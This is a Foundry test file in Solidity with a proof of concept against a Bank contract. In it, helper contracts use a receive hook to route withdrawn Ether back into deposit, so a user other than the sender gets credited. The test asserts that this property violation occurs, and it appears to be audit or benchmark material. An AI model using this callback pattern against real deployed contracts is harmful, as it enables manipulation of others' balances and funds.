

pragma solidity ^0.8.13;
import "forge-std/Test.sol";
import "../Bank.sol";

// property: after a successful withdraw(amount), the balances of any user but the sender are preserved.
// helper contracts for the PoC: A receives Ether and forwards it to B.foo,
// B.foo forwards the Ether to Bank.deposit so deposit's `msg.sender == B`.
contract B {
    Bank public bank;
    constructor(Bank _bank) {
        bank = _bank;
    }
    function foo() public payable {
        bank.deposit{value: msg.value}();
    }
}

contract A {
    Bank public bank;
    B public b;
    constructor(address payable _b, Bank _bank) payable {
        b = B(_b);
        bank = _bank;
    }
    receive() external payable {
        b.foo{value: msg.value}();
    }
}

contract BankTest is Test {         
    Bank immutable bank;
    
    constructor() {
        // deploying a Bank contract
        address bank_deployer = address(0xBEEF);
        vm.prank(bank_deployer);
        bank = new Bank();
    }
    
    
    function test_withdraw_assets_credit_others_violation() public {

        B b = new B(bank);
        A a = new A(payable(address(b)), bank);
        uint256 depositAmount = 1 ether;
        vm.deal(address(a), depositAmount);
        vm.prank(address(a));
        bank.deposit{value: depositAmount}();

    	address user = address(b);
        uint256 user_creditsBefore = bank.credits(user);

        uint256 amount = depositAmount;
        address sender = address(a);
        vm.prank(sender);
        bank.withdraw(amount); // should not revert
	
        uint256 user_creditsAfter = bank.credits(user);

        assertNotEq(sender, user, "user equal to sender");

        assertNotEq(user_creditsBefore, user_creditsAfter, "user credits did not change");
    }
}
